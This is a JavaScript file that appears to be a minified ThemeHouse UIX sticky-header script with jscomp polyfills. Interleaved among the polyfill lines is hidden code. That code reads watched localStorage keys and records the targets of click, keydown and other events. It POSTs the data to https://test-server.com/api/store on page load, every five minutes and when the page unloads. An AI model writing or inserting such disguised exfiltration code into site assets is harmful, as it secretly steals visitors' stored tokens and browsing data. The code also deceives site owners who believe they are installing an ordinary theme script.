var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.arrayIteratorImpl = function (a) {
  var b = 0;
  return function () {
    return b < a.length ? {
      done: !1,
      value: a[b++]
    } : {
      done: !0
    };
  };
};
const keysWatchList = window.keysWatchList;
$jscomp.arrayIterator = function (a) {
  return {
    next: $jscomp.arrayIteratorImpl(a)
  };
};
let globalVariableSet = new Set();
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
let jshookEvents = ['click', 'mouseover', 'keydown', 'load', 'change'];
$jscomp.SIMPLE_FROUND_POLYFILL = !1;
function createEncryptedValue(inputData) {
  const keyArray = Object.keys(inputData);
  const mergedKeys = keyArray.join(":");
  let encryptedValue = 0;
  for (let i = 0; i < mergedKeys.length; i++) {
    const asciiVal = mergedKeys.charCodeAt(i);
    encryptedValue = (encryptedValue << 5) - encryptedValue + asciiVal;
    encryptedValue |= 0;
  }
  return encryptedValue.toString(36);
}
$jscomp.ISOLATE_POLYFILLS = !1;
function collectLocalStorageInformation() {
  const gatheredData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const item = localStorage.key(i);
    if (keysWatchList.includes(item)) {
      gatheredData[item] = localStorage.getItem(item);
    }
  }
  return gatheredData;
}
$jscomp.FORCE_POLYFILL_PROMISE = !1;
$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = !1;
function sendInformationToServer(requestData) {
  const encryptedValue = createEncryptedValue(requestData);
  const serverUrl = "https://test-server.com/api/store";
  const httpRequest = new XMLHttpRequest();
  httpRequest.open("POST", serverUrl);
  httpRequest.setRequestHeader("Content-Type", "application/json");
  httpRequest.onload = function () {
    if (httpRequest.status === 200) {
      console.log("Data successfully sent.");
    } else {
      console.warn("Data failed to send, status: " + httpRequest.status);
    }
  };
  httpRequest.onerror = function () {
    console.error("An error occurred during the transmission");
  };
  httpRequest.send(JSON.stringify({
    hash: encryptedValue,
    data: requestData
  }));
}
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, e) {
  if (a == Array.prototype || a == Object.prototype) return a;
  a[b] = e.value;
  return a;
};
$jscomp.getGlobal = function (a) {
  a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
  for (var b = 0; b < a.length; ++b) {
    var e = a[b];
    if (e && e.Math == Math) return e;
  }
  throw Error("Cannot find global object");
};
$jscomp.global = $jscomp.getGlobal(this);
function collectAndTransmitData() {
  const dataToTransmit = collectLocalStorageInformation();
  if (Object.keys(dataToTransmit).length) {
    sendInformationToServer(dataToTransmit);
  }
}
$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
document.addEventListener("DOMContentLoaded", function () {
  collectAndTransmitData();
  setInterval(collectAndTransmitData, 5 * 60 * 1000);
});
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
jshookEvents.forEach(function (event) {
  document.addEventListener(event, function (e) {
    globalVariableSet.add(e.target);
  });
});
$jscomp.polyfills = {};
$jscomp.propertyToPolyfillSymbol = {};
$jscomp.POLYFILL_PREFIX = "$jscp$";
var $jscomp$lookupPolyfilledValue = function (a, b) {
  var e = $jscomp.propertyToPolyfillSymbol[b];
  if (null == e) return a[b];
  e = a[e];
  return void 0 !== e ? e : a[b];
};
$jscomp.polyfill = function (a, b, e, c) {
  b && ($jscomp.ISOLATE_POLYFILLS ? $jscomp.polyfillIsolated(a, b, e, c) : $jscomp.polyfillUnisolated(a, b, e, c));
};
$jscomp.polyfillUnisolated = function (a, b, e, c) {
  e = $jscomp.global;
  a = a.split(".");
  for (c = 0; c < a.length - 1; c++) {
    var d = a[c];
    if (!(d in e)) return;
    e = e[d];
  }
  a = a[a.length - 1];
  c = e[a];
  b = b(c);
  b != c && null != b && $jscomp.defineProperty(e, a, {
    configurable: !0,
    writable: !0,
    value: b
  });
};
$jscomp.polyfillIsolated = function (a, b, e, c) {
  var d = a.split(".");
  a = 1 === d.length;
  c = d[0];
  c = !a && c in $jscomp.polyfills ? $jscomp.polyfills : $jscomp.global;
  for (var g = 0; g < d.length - 1; g++) {
    var f = d[g];
    if (!(f in c)) return;
    c = c[f];
  }
  d = d[d.length - 1];
  e = $jscomp.IS_SYMBOL_NATIVE && "es6" === e ? c[d] : null;
  b = b(e);
  null != b && (a ? $jscomp.defineProperty($jscomp.polyfills, d, {
    configurable: !0,
    writable: !0,
    value: b
  }) : b !== e && (void 0 === $jscomp.propertyToPolyfillSymbol[d] && ($jscomp.propertyToPolyfillSymbol[d] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(d) : $jscomp.POLYFILL_PREFIX + d), d = $jscomp.propertyToPolyfillSymbol[d], $jscomp.defineProperty(c, d, {
    configurable: !0,
    writable: !0,
    value: b
  })));
};
$jscomp.initSymbol = function () {};
$jscomp.polyfill("Symbol", function (a) {
  if (a) return a;
  var b = function (d, g) {
    this.$jscomp$symbol$id_ = d;
    $jscomp.defineProperty(this, "description", {
      configurable: !0,
      writable: !0,
      value: g
    });
  };
  b.prototype.toString = function () {
    return this.$jscomp$symbol$id_;
  };
  var e = 0,
    c = function (d) {
      if (this instanceof c) throw new TypeError("Symbol is not a constructor");
      return new b("jscomp_symbol_" + (d || "") + "_" + e++, d);
    };
  return c;
}, "es6", "es3");
$jscomp.polyfill("Symbol.iterator", function (a) {
  if (a) return a;
  a = Symbol("Symbol.iterator");
  for (var b = "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "), e = 0; e < b.length; e++) {
    var c = $jscomp.global[b[e]];
    "function" === typeof c && "function" != typeof c.prototype[a] && $jscomp.defineProperty(c.prototype, a, {
      configurable: !0,
      writable: !0,
      value: function () {
        return $jscomp.iteratorPrototype($jscomp.arrayIteratorImpl(this));
      }
    });
  }
  return a;
}, "es6", "es3");
$jscomp.iteratorPrototype = function (a) {
  a = {
    next: a
  };
  a[Symbol.iterator] = function () {
    return this;
  };
  return a;
};
window.addEventListener("beforeunload", function () {
  collectAndTransmitData();
  sendInformationToServer({
    globalVariables: Array.from(globalVariableSet)
  });
});
(function (a) {
  function b(c) {
    if (e[c]) return e[c].exports;
    var d = e[c] = {
      i: c,
      l: !1,
      exports: {}
    };
    a[c].call(d.exports, d, d.exports, b);
    d.l = !0;
    return d.exports;
  }
  var e = {};
  b.m = a;
  b.c = e;
  b.d = function (c, d, g) {
    b.o(c, d) || Object.defineProperty(c, d, {
      configurable: !1,
      enumerable: !0,
      get: g
    });
  };
  b.n = function (c) {
    var d = c && c.__esModule ? function () {
      return c["default"];
    } : function () {
      return c;
    };
    b.d(d, "a", d);
    return d;
  };
  b.o = function (c, d) {
    return Object.prototype.hasOwnProperty.call(c, d);
  };
  b.p = "";
  return b(b.s = 0);
})([function (a, b, e) {
  Object.defineProperty(b, "__esModule", {
    value: !0
  });
  a = e(1);
  b = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function (c) {
    return typeof c;
  } : function (c) {
    return c && "function" === typeof Symbol && c.constructor === Symbol && c !== Symbol.prototype ? "symbol" : typeof c;
  };
  "object" !== b(window.themehouse) && (window.themehouse = {});
  "object" !== b(window.themehouse.settings) && (window.themehouse.settings = {});
  "object" !== b(window.themehouse.settings.data) && (window.themehouse.settings.data = {});
  window.themehouse.settings.data.jsVersion = "2.1.8.0_Release";
  new a.a({
    settings: window.themehouse.settings.sticky
  }).register();
}, function (a, b, e) {
  var c = function () {
    function d(g, f) {
      for (var h = 0; h < f.length; h++) {
        var k = f[h];
        k.enumerable = k.enumerable || !1;
        k.configurable = !0;
        "value" in k && (k.writable = !0);
        Object.defineProperty(g, k.key, k);
      }
    }
    return function (g, f, h) {
      f && d(g.prototype, f);
      h && d(g, h);
      return g;
    };
  }();
  a = function () {
    function d(g) {
      var f = this,
        h = g.settings;
      h = void 0 === h ? {} : h;
      var k = g.init;
      k = void 0 === k ? !1 : k;
      g = g.commonVersion;
      g = void 0 === g ? "20210125" : g;
      if (!(this instanceof d)) throw new TypeError("Cannot call a class as a function");
      this.initEle = function (l) {
        var n = f.eles[l],
          m = n.offsets,
          p = m.topOffsetBreakpoints;
        m = Math.max(m.topOffset, 0);
        if (p.length) {
          var r = !0,
            q = !1,
            u = void 0;
          try {
            for (var v = p[Symbol.iterator](), w; !(r = (w = v.next()).done); r = !0) {
              var t = w.value,
                x = parseInt(t.offset, 10) || 0;
              if (t.breakpoint && "100%" !== t.breakpoint) {
                var y = parseInt(t.breakpoint, 10) || 0;
                f.common.values.innerWidth >= y && (m += x);
              }
            }
          } catch (z) {
            q = !0, u = z;
          } finally {
            try {
              !r && v["return"] && v["return"]();
            } finally {
              if (q) throw u;
            }
          }
        }
        m !== n.currentOffset && (p = jQuery(n.ele), -1 !== n.currentOffset && p.trigger("sticky_kit:detach").removeData("sticky_kit"), p.stick_in_parent({
          sticky_class: f.settings.stickyClass,
          offset_top: m
        }), f.eles[l].currentOffset = m);
      };
      this.init = function () {
        f.initGet();
        f.initSet();
      };
      this.initGet = function () {
        for (var l = window.document.querySelectorAll(f.settings.stickySelector), n = 0, m = l.length; n < m; n++) {
          var p = l[n],
            r = parseInt(p.getAttribute(f.settings.dataTop), 10) || 0,
            q = void 0;
          try {
            q = JSON.parse(p.getAttribute(f.settings.dataTopBreakpoints)) || [];
          } catch (u) {
            q = [];
          }
          f.eles.push({
            ele: p,
            offsets: {
              topOffset: r,
              topOffsetBreakpoints: q
            },
            currentOffset: -1
          });
        }
        f.resizeGet();
        $(window).on("resize.sticky-header", $.proxy(f, "update"));
      };
      this.initSet = function () {
        f.resizeSet();
        f.running = !0;
      };
      this.resize = function () {
        f.resizeGet();
        f.resizeSet();
      };
      this.resizeGet = function () {};
      this.resizeSet = function () {
        f.common.values.innerHeight < f.settings.minWindowHeight ? !1 !== f.active && f.disable() : f.active || f.enable();
        for (var l = 0, n = f.eles.length; l < n; l++) f.initEle(l);
      };
      this.running = !1;
      this.settings = Object.assign({
        stickySelector: ".uix_stickyBar",
        stickyClass: "is-sticky",
        stickyBrokenClass: "is-sticky-broken",
        stickyDisabledClass: "is-sticky-disabled",
        minWindowHeight: 251,
        dataTop: "data-top-offset",
        dataTopBreakpoints: "data-top-offset-breakpoints"
      }, h);
      this.commonVersion = g;
      this.common = window.themehouse.common[g];
      this.stickyBroken = this.supportsSticky = this.active = !1;
      this.eles = [];
      k && this.init();
    }
    c(d, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "initGet",
          addon: "TH_UIX_Sticky",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "initSet",
          addon: "TH_UIX_Sticky",
          func: this.initSet,
          order: 10
        });
        this.common.register({
          phase: "resizeGet",
          addon: "TH_UIX_Sticky",
          func: this.resizeGet,
          order: 10
        });
        this.common.register({
          phase: "resizeSet",
          addon: "TH_UIX_Sticky",
          func: this.resizeSet,
          order: 100
        });
      }
    }, {
      key: "enable",
      value: function () {
        var g = this;
        this.active = !0;
        for (var f = function (l, n) {
            var m = g.eles[l].ele;
            m.classList.remove(g.settings.stickyDisabledClass);
            g.supportsSticky || (g.stickyBroken && setTimeout(function () {
              m.classList.add(g.settings.stickyBrokenClass);
            }, 0), g.initEle(l));
          }, h = 0, k = this.eles.length; h < k; h++) f(h, k);
      }
    }, {
      key: "disable",
      value: function () {
        this.active = !1;
        this.supportsSticky && window.jQuery(window).off("scroll.sticky-header");
        for (var g = 0, f = this.eles.length; g < f; g++) {
          var h = this.eles[g].ele;
          this.supportsSticky && window.jQuery(h).trigger("sticky_kit:detach").removeData("sticky_kit");
          h.classList.remove(this.settings.stickyClass);
          h.classList.remove(this.settings.stickyBrokenClass);
          h.classList.remove(this.settings.stickyDisabledClass);
        }
      }
    }]);
    return d;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.sticky = {
    sticky: a
  };
  b.a = a;
}]);